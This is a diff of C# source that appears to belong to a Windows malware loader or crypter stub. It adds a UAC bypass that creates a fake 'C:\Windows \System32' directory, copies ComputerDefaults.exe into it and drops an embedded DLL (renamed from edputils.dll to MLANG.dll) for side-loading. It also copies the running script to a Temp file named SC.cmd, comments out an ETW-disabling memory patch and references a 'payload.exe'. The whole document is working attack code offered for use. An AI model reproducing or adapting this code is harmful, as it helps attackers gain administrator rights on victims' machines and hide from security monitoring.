@@ -47,13 +47,22 @@ namespace namespace_name
             Version osversion = Environment.OSVersion.Version;
             if ((osversion.Major >= 6 && osversion.Minor >= 1) || osversion.Major >= 10)
             {
+                string localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                string tempPath = Path.Combine(localAppDataPath, "Temp");
+                string scCmdPath = Path.Combine(tempPath, "SC.cmd");
+                if (File.Exists(scCmdPath))
+                {
+                    File.Delete(scCmdPath);
+                }
+
+                File.Copy(Console.Title, scCmdPath);
                 try
                 {
                     if (!IsAdmin())
                     {
                         Directory.CreateDirectory("\\\\?\\C:\\Windows \\System32");
                         File.Copy("C:\\Windows\\System32\\ComputerDefaults.exe", "C:\\Windows \\System32\\ComputerDefaults.exe", true);
-                        File.WriteAllBytes("C:\\Windows \\System32\\edputils.dll", uncompressfunction_name(getembeddedresourcefunction_name(@"UAC")));
+                        File.WriteAllBytes("C:\\Windows \\System32\\MLANG.dll", uncompressfunction_name(getembeddedresourcefunction_name(@"UAC")));
                         Process.Start(new ProcessStartInfo()
                         {
                             FileName = "C:\\Windows \\System32\\ComputerDefaults.exe",
@@ -110,13 +119,13 @@ namespace namespace_name
             }
 #endif
 
-            IntPtr ntdll = LoadLibrary(@"ntdll.dll");
-            IntPtr etwaddr = GetProcAddress(ntdll, @"EtwEventWrite");
-            byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xC3 } : new byte[] { 0xC2, 0x14, 0x00 };
-            uint oldProtect;
-            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
-            Marshal.Copy(Patch, 0, etwaddr, Patch.Length);
-            VirtualProtect(etwaddr, (UIntPtr)Patch.Length, oldProtect, out oldProtect);
+            /* IntPtr ntdll = LoadLibrary(@"ntdll.dll");
+             IntPtr etwaddr = GetProcAddress(ntdll, @"EtwEventWrite");
+             byte[] Patch = (IntPtr.Size == 8) ? new byte[] { 0xC3 } : new byte[] { 0xC2, 0x14, 0x00 };
+             uint oldProtect;
+             VirtualProtect(etwaddr, (UIntPtr)Patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
+             Marshal.Copy(Patch, 0, etwaddr, Patch.Length);
+             VirtualProtect(etwaddr, (UIntPtr)Patch.Length, oldProtect, out oldProtect);*/
 
             string payloadstr = @"payload.exe";
             
